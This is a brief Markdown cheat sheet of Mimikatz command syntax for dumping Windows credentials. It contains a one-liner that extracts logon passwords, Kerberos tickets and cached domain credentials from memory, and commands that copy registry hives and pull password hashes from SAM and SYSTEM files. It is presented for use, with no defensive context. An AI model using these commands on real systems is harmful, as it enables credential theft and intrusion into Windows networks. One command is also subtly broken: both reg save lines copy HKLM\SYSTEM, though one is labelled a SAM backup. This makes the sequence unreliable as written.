# Mimikatz syntax

1. mimkatz 1 liner:
   - `Mimikatz.exe "log mimikatz.log" "sekurlsa::logonpasswords" "sekurlsa::tickets" "lsadump::cache" exit`
  
2. mimikatz SAM and SYSTEM files:
   - `Mimikatz.exe "log mimikatz.log" "lsadump::sam /system:<system file> /sam:<sam file>" exit`
   - reg save HKLM\SYSTEM sambakup.hiv
   - reg save HKLM\SYSTEM systembakup.hiv
